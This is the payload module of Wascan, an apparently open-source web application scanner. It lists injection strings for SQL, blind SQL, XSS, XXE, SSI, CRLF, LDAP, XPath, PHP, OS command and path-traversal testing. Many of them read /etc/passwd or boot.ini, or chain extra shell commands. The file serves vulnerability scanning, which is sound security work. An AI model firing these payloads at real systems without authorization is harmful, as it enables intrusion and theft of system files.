#!/usr/bin/env python 
# -*- coding:utf-8 -*-
#
# @name:    Wascan - Web Application Scanner
# @repo:    https://github.com/m4ll0k/Wascan
# @author:  Momo Outaadi (M4ll0k)
# @license: See the file 'LICENSE.txt

from lib.utils.rand import *
from urllib import quote_plus

def ssip():
	""" Server Side Injection """
	payload  = ['<pre><!--#exec cmd="/etc/passwd" --></pre>']
	payload += ['<pre><!--#exec cmd="/bin/cat /etc/passwd" --></pre>']
	payload += ['<pre><!--#exec cmd="/bi*/ca? /et*/passw?" --></pre>']
	payload += ['<!--#exec cmd="/etc/passwd" -->']
	payload += ['<!--#exec cmd="/et*/pa??w?" -->']
	return payload

def crlfp():
	"""Carriage Return Line Feed"""
	payload  = [r'%%0a0aSet-Cookie:crlf=injection']
	payload += [r'%0aSet-Cookie:crlf=injection']
	payload += [r'%0d%0aSet-Cookie:crlf=injection']
	payload += [r'%0dSet-Cookie:crlf=injection']
	payload += [r'%23%0d%0aSet-Cookie:crlf=injection']
	payload += [r'%25%30%61Set-Cookie:crlf=injection']
	payload += [r'%2e%2e%2f%0d%0aSet-Cookie:crlf=injection']
	payload += [r'%2f%2e%2e%0d%0aSet-Cookie:crlf=injection']
	return payload

def xxep():
	""" XML External Entity"""
	payload  = ['<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM "file:///etc/passwd"> ]>']
	payload += ['<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM "file:///c:/boot.ini"> ]>']
	payload += ['<!DOCTYPE foo [<!ENTITY xxe46471 SYSTEM "file:///etc/passwd"> ]>']
	payload += ['<!DOCTYPE foo [<!ENTITY xxe46471 SYSTEM "file:///c:/boot.ini"> ]>']
	payload += ['<?xml version="1.0"?><change-log><text>root:/bin/bash</text></change-log>']
	payload += ['<?xml version="1.0"?><change-log><text>default=multi(0)disk(0)rdisk(0)partition(1)</text></change-log>']
	return payload

def pssi():
	""" Server Side Include"""
	payload  = ["<!--#exec cmd=\"/bin/echo '{random_string}'\"-->".format(random_string=r_string)]
	payload += ["<!--#exec cmd=\"/etc/passwd\"-->"]
	payload += ["<pre><!--#exec cmd=\"/bin/echo '{random_string}'\" --></pre>".format(random_string=r_string)]
	payload += ["<pre><!--#exec cmd=\"/etc/passwd\" --></pre>"]
	return payload

def pxss():
	""" Cross-Site Scripting"""
	payload =  [r"<script>alert('"+r_string(5)+"')</script>"]
	payload += [r"<script>alert('"+r_string(5)+r"');</script>"]
	payload += [r"\'\';!--\"<"+r_string(5)+r">=&{()}"]
	payload += [r"<script>a=/"+r_string(5)+r"/"]
	payload += [r"<body onload=alert('"+r_string(5)+r"')>"]
	payload += [r"<iframe src=javascript:alert('"+r_string(5)+r"')>"]
	payload += [r"<x onxxx=alert('"+r_string(5)+r"') 1='"]
	payload += [r"</script><svg onload=alert("+r_string(5)+r")>"]
	payload += [r"<svg onload=alert('"+r_string(5)+r"')>"]
	payload += [r"alert\`"+r_string(5)+r"\`"]
	payload += [r"><script>"+r_string(5)+""]
	payload += [r"\"><script>alert('"+r_string(5)+"');</script>"]
	payload += [r"<  script > "+r_string(5)+" < / script>"]
	return payload

def php():
	""" PHP Code Injection """
	payload = ["system('/bin/echo%20\""+r_string(30)+"\"')"]
	payload += ["system('/bin/cat%20/etc/passwd')"]
	payload += ["system('echo\""+r_string(30)+"\"')"]
	return payload

def xpath():
	""" Xpath """
	payload = ["\'"]
	payload += ["//*"]
	payload += ["@*"]
	payload += ["\' OR \'=\'"]
	payload += ["\' OR \'1\'=\'1\'"]
	payload += ["x\' or 1=1 or \'x\'=\'y"]
	payload += ["%s\' or 1=1 or \'%s\'=\'%s"%(r_string(10),r_string(10),r_string(10))]
	payload += ["x' or name()='username' or 'x'='y"]
	payload += ["%s\' or name()='username' or '%s'='%s"%(r_string(10),r_string(10),r_string(10))]
	payload += ["\' and count(/*)=1 and \'1\'=\'1"]
	payload += ["\' and count(/@*)=1 and \'1\'=\'1"]
	return payload

def bash():
	"""Basic Bash Command Injection """
	payload  = ["/bin/cat /etc/passwd"]
	payload += ["/etc/passwd"]
	payload += ["/et*/passw?"]
	payload += ["/ca?/bi? /et?/passw?"]
	payload += ["/et*/pa??wd"]
	payload += ["cat /etc/passwd"]
	payload += ["/bi*/echo \"%s\""%(r_string(10))]
	return payload

def sql():
	"""Generic SQL"""
	payload = ["\'"]
	payload += ["\\\'"]
	payload += ["||\'"]
	payload += ["1\'1"]
	payload += ["-%s"%(r_time())]
	payload += ["\'%s"%(r_time())]
	payload += ["%s\'"%(r_string(10))]
	payload += ["\\\"%s"%(r_string(10))]
	payload += ["%s=\'%s"%(r_time(),r_time())]
	payload += ["))\'+OR+%s=%s"%(r_time(),r_time())]
	payload += ["))) AND %s=%s"%(r_time(),r_time())]
	payload += ["; OR \'%s\'=\'%s\'"%(r_time(),r_time())]
	payload += ["\'OR \'))%s=%s --"%(r_time(),r_time())]
	payload += ["\'AND \')))%s=%s --#"%(r_time(),r_time())]
	payload += [" %s 1=1 --"%(r_string(20))]
	payload += [" or sleep(%s)=\'"%(r_time())]
	payload += ["%s' AND userid IS NULL; --"%(r_string(10))]
	payload += ["\") or pg_sleep(%s)--"%(r_time())]
	payload += ["; exec (\'sel\' + \'ect us\' + \'er\')"]
	return payload

def os():
	""" OS Command Injection """
	payload = ["%secho \"%s\""%(quote_plus("&"),r_string(30))]
	payload += ["%secho \"%s\""%(quote_plus("&&"),r_string(30))]
	payload += ["%secho \"%s\""%(quote_plus("|"),r_string(30))]
	payload += ["%secho \"%s\""%(quote_plus(";"),r_string(30))]
	payload += ["%secho \"%s\""%(quote_plus("||"),r_string(30))]
	payload += ["\techo \"%s\""%(r_string(30))]
	payload += ["\t\techo \"%s\""%(r_string(30))]
	payload += ["%s\"/bin/cat /etc/passwd\""%quote_plus('|')]
	payload += ["%s\"/etc/passwd\""%quote_plus('|')]
	return payload

def plfi():
	""" Local file Inclusion """
	payload = ["/etc/passwd%00"]
	payload += ["/etc/passwd"]
	payload += ["etc/passwd"]
	payload += ["%00../../../../../../etc/passwd"]
	payload += ["%00../etc/passwd%00"]
	payload += ["/./././././././././././boot.ini"]
	payload += [r"/..\../..\../..\../..\../..\../..\../boot.ini"]
	payload += ["..//..//..//..//..//boot.ini"]
	payload += ["../../boot.ini"]
	payload += ["/../../../../../../../../../../../boot.ini%00"]
	payload += ["/../../../../../../../../../../../boot.ini%00.html"]
	payload += ["C:/boot.ini"]
	payload += ["/../../../../../../../../../../etc/passwd^^"]
	payload += [r"/..\../..\../..\../..\../..\../..\../etc/passwd"]
	payload += [r"..\..\..\..\..\..\..\..\..\..\etc\passwd%"]
	payload += ["../../../../../../../../../../../../localstart.asp"]
	payload += ["index.php"]
	payload += ["../index.php"]
	payload += ["index.asp"]
	payload += ["../index.asp"]
	return payload

def bsql():
	""" Blind SQL Injection """
	payload = [" AND %s=%s"%(r_time(),r_time())]
	payload += [" OR %s=%s"%(r_time(),r_time())]
	payload += [") AND %s=%s"%(r_time(),r_time())]
	payload += [")) AND %s=%s"%(r_time(),r_time())]
	payload += ["))) AND %s=%s"%(r_time(),r_time())]
	payload += [") OR %s=%s"%(r_time(),r_time())]
	payload += [")) OR %s=%s"%(r_time(),r_time())]
	payload += ["))) OR %s=%s"%(r_time(),r_time())]
	payload += ["sleep(%s)#"%(r_time())]
	payload += ["\" or sleep(%s)#"%(r_time())]
	payload += ["\' or sleep(%s)#"%(r_time())]
	payload += ["\' or sleep(%s)=\'"%(r_time())]
	payload += ["1) or sleep(%s)#"%(r_time())]
	payload += ["\')) or sleep(%s)=\'"%(r_time())]
	payload += [";waitfor delay \'0:0:%s\'--"%(r_time())]
	payload += ["\"));waitfor delay \'0:0:%s\'--"%(r_time())]
	payload += ["1 or benchmark(10000000,MD5(1))#"]
	payload += ["')) or benchmark(10000000,MD5(1))#"]
	payload += ["\')) or pg_sleep(%s)--"%(r_time())]
	payload += [") AND %s=%s AND (%s=%s"%(r_time(),r_time(),r_time(),r_time())]
	payload += [") AND %s=%s AND (8533=8533"%(r_time(),r_time())]
	payload += ["\') AND %s=%s AND (\'%s\'=\'%s"%(r_time(),r_time(),r_string(5),r_string(5))]
	payload += ["\' OR NOT %s=%s-- %s"%(r_time(),r_time(),r_string(5))]
	payload += ["\' OR NOT %s=   %s-- %s"%(r_time(),r_time(),r_string(5))]
	payload += ["\' OR NOT (%s)=%s-- %s"%(r_time(),r_time(),r_string(5))]
	return payload

def html():
	""" HTML Code Injection """
	payload = ["<p>%s</p>"%(r_string(20))]
	payload += ["<h1>%s</h1>"%(r_string(20))]
	payload += ["<a href=\"http://www.%s.com\"><h1>Login</h1></a>"%(r_string(30))]
	return payload

def ldap():
	""" LDAP Injection """
	payload = ["!"]
	payload += ["%29"]
	payload += ["%21"]
	payload += ["%28"]
	payload += ["%26"]
	payload += ["("]
	payload += [")"]
	payload += ["@\'"]
	payload += ["*()|&'"]
	payload += ["%s*"%r_string(10)]
	payload += ["*(|(%s=*))"%r_string(10)]
	payload += ["%s*)((|%s=*)"%(r_string(10),r_string(10))] 
	payload += [r"%2A%28%7C%28"+r_string(10)+r"%3D%2A%29%29"]
	return payload
